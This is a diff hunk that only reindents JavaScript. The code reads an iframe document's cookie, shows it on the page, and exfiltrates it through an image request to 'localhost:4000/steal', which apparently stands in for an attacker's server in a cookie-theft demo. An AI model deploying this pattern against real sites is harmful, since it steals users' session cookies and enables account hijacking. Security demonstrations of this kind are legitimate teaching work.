@@ -12,11 +12,11 @@
 
 
             setTimeout(function() {
-                const p = document.createElement('p')
-                p.innerHTML = iframe.contentDocument.cookie
-                document.body.appendChild(p)
+            const p = document.createElement('p')
+            p.innerHTML = iframe.contentDocument.cookie
+            document.body.appendChild(p)
 
-                new Image().src = 'http://localhost:4000/steal?cookie=' + iframe.contentDocument.cookie
+            new Image().src = 'http://localhost:4000/steal?cookie=' + iframe.contentDocument.cookie
             }, 5000);
 
 
